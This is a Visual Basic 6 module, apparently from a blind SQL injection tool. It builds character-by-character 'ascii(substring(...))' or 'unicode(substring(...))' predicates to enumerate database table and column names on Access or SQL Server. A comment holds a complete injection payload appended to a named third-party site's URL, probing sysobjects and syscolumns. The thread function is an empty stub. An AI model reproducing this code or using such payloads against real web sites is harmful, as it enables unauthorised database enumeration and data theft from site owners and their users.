Attribute VB_Name = "mduSqlin"
Public Declare Function CreateThread Lib "kernel32" (lpThreadAttributes As SECURITY_ATTRIBUTES, ByVal dwStackSize As Long, lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
Public Declare Sub ExitThread Lib "kernel32" (ByVal dwExitCode As Long)
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Public Type SECURITY_ATTRIBUTES
        nLength As Long
        lpSecurityDescriptor As Long
        bInheritHandle As Long
End Type

Public Const MAX_TABLENAME_LENGTH As Long = 128
Public Const START_INDEX As Long = 1

Public Const STAT_UNKOWN As Long = 0
Public Const STAT_SUCCESS As Long = 1
Public Const STAT_FAIL As Long = 2


Public Function SqlInThread(ByVal lpParameter As Long) As Long

    SqlInThread = 0
End Function

Public Function StartOne() As Long
    Dim udt As SECURITY_ATTRIBUTES
    Dim l As Long
    udt.nLength = Len(udt)
    l = CreateThread(udt, 0&, AddressOf SqlInThread, 0&, 0&, StartOne)
    If l = 0 Then
        Exit Function
    End If
    CloseHandle l
    
End Function

Public Function StrToCHAR(sCol As String, ByVal sVal As String) As String
    StrToCHAR = ""
    If frm.optAccess.Value = True Then
        s = sVal
        For i = 1 To Len(s)
            If i <> 1 Then
                StrToCHAR = StrToCHAR & " and "
            End If
            
            StrToCHAR = StrToCHAR & " ascii(substring(" & sCol & "," & Str(i) & ",1)) =" & Asc(Mid(s, i, 1))
        Next
    Else
        's = StrConv(sVal, vbFromUnicode)
        s = sVal
        For i = 1 To Len(s)
            If i <> 1 Then
                StrToCHAR = StrToCHAR & " and "
            End If
            StrToCHAR = StrToCHAR & " unicode(substring(" & sCol & "," & Str(i) & ",1)) =" & ASCToUCS2(Mid(s, i, 1))
        Next
    End If
End Function
'http://www.17dvd.com/view.asp?id=1502 and exists(select * from syscolumns a left join sysobjects b on a.id=b.id where ascii(substring(b.name, 1,1)) =110 and  ascii(substring(b.name, 2,1)) =112 and  ascii(substring(b.name, 3,1)) =117 and  ascii(substring(b.name, 4,1)) =115 and  ascii(substring(b.name, 5,1)) =101 and  ascii(substring(b.name, 6,1)) =114 and  ascii(substring(b.name, 7,1)) =105 and  ascii(substring(b.name, 8,1)) =110 and  ascii(substring(b.name, 9,1)) =102 and  ascii(substring(b.name, 10,1)) =111)
Public Function UCS2ToASC(lCode As Long) As String
    Dim s As String
    Dim b(1) As Byte
    s = Right("0000" & Hex(lCode), 4)
    b(0) = Val("&h" & Left(s, 2))
    b(1) = Val("&h" & Right(s, 2))
    UCS2ToASC = ChrB(b(1)) + ChrB(b(0))
End Function


Public Function ASCToUCS2(sChar As String) As String
    Dim s As String
    Dim b(1) As Byte
    ASCToUCS2 = 0
    s = sChar
    If s <> "" Then
        b(0) = AscB(LeftB(s, 1))
        b(1) = AscB(RightB(s, 1))
        ASCToUCS2 = CLng("&h" & Right("00" & Hex(b(1)), 2) & Right("00" & Hex(b(0)), 2))
    End If
End Function

